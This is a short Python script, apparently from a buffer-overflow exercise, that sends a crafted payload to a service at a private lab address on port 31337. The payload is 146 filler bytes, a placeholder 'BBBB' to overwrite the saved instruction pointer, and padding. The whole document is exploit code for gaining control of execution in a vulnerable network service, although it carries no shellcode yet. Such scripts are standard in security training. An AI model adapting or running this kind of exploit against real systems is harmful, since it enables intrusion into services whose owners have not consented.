import socket, struct

host, port = '192.168.1.93', 31337
newline = b'\n'
offset = 146
length = 1000
new_eip = b'BBBB'
payload = b''.join([
b'A'*146,
new_eip,
b'C' * (length - offset - len(new_eip)),
newline,
])





with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
